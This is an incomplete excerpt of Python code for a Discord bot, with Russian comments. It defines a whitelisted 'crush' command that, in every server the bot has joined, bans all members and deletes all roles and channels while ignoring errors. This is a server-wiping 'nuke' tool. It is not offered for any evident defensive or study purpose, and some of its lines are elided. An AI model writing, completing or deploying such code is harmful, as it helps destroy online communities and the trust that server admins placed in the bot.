...
@client.command()
async def crush(ctx):
    if ctx.message.author.id in crush_members:
        ...
        for i in bot.guilds:
            ...
            for i in allmembers:  # Баним всех участников
            ...
            for i in allroles:  # Удаляем все роли
                try:
                    await i.delete()
                except:
                    pass

            for i in allchannels:  # Удаляем все каналы
                try:
                    await i.delete()
                except:
                    pass
